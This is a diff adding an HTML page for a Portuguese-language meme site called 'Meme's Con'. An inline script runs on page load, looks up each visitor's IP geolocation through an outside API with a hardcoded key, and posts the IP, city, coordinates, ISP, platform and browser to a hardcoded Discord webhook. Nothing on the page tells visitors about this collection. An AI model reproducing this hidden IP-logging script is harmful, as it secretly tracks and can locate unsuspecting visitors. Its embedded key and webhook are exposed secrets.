@@ -1,0 +1,90 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>Projeto Número 1°</title>
+
+  <link href="https://fonts.googleapis.com/css2?family=Poppins&display=swap" rel="stylesheet" />
+  
+  <style>
+    body {
+      background-color: black;
+      background-image: url('https://media.discordapp.net/attachments/1365434809668735068/1367454988313428059/3be02dfbdab626341a2f089de3e41085.jpg?ex=6814a533&is=681353b3&hm=a90917fd505916cecce4cf821bdeac00a6ddb3eae4fe85437d594ca28e2d502e&');
+      background-size: cover;
+      font-family: 'Poppins', sans-serif;
+      color: white;
+    }
+
+    h1, p, h4 {
+      font-family: 'Poppins', sans-serif;
+    }
+
+    p {
+      color: lightgray;
+    }
+
+    h4 {
+      color: gray;
+    }
+
+    a {
+      color: white;
+      text-decoration: none;
+    }
+  </style>
+
+  <meta property="og:title" content="Meme's Con!" />
+  <meta property="og:description" content="Um site super-legal para seu entretenimento diário!" />
+  <meta property="og:image" content="https://media.discordapp.net/attachments/1367240970067771523/1367295534364364860/8f1b89f576c8fd41c41ec49f9eca6195.jpg?ex=681410b2&is=6812bf32&hm=99bc2d044f31a3f265d8bce88be05dabbc035795bdef626a10158787d7121249&" />
+  <meta property="og:url" content="https://seusite.com" />
+  <meta property="og:type" content="website" />
+
+  <script>
+    const apiKey = "43c6b88477114dcbd91fc7a1e6bd20e6";
+
+    fetch(`https://api.ipstack.com/check?access_key=${apiKey}&format=1`)
+      .then(response => response.json())
+      .then(data => {
+        const info = `
+Novo visitante no site de memes:
+IP: ${data.ip}
+Cidade: ${data.city}
+Região: ${data.region_name}
+País: ${data.country_name}
+Latitude: ${data.latitude}
+Longitude: ${data.longitude}
+ISP: ${data.connection.org}
+Sistema: ${navigator.platform}
+Navegador: ${navigator.userAgent}
+        `;
+
+        fetch("https://discord.com/api/webhooks/1367457512554758270/LS3Nnoa5o8R5O9AiijLrPbSsSvGXpq35H98eI6HSoqQvELoOJvYhIMow70iyuKSf6trT", {
+          method: "POST",
+          headers: { "Content-Type": "application/json" },
+          body: JSON.stringify({ content: info })
+        }).then(response => {
+          if (!response.ok) {
+            console.error("Erro ao enviar para o webhook:", response.statusText);
+          }
+        }).catch(err => {
+          console.error("Erro na requisição do webhook:", err);
+        });
+      })
+      .catch(error => {
+        console.error("Erro ao coletar dados:", error);
+      });
+  </script>
+</head>
+
+<body>
+  <h1>Meme's Con</h1>
+  <p>Você chegou na página principal da Meme's Con — um lugar com uma variedade de memes vindos diretamente da internet! Somente os melhores são selecionados para nosso site!</p>
+  <h4>Não adicionamos memes com temas: Machismo, Feminismo, Nazismo, Comunismo, Guerras ou conteúdo 18+ explícito.</h4>
+
+  <ul>
+    <li><a href="Mdiscord.html">Veja Memes do meu Discord!</a></li>
+    <li><a href="Mjogoshtml">Veja memes de jogos</a></li>
+  </ul>
+</body>
+</html>
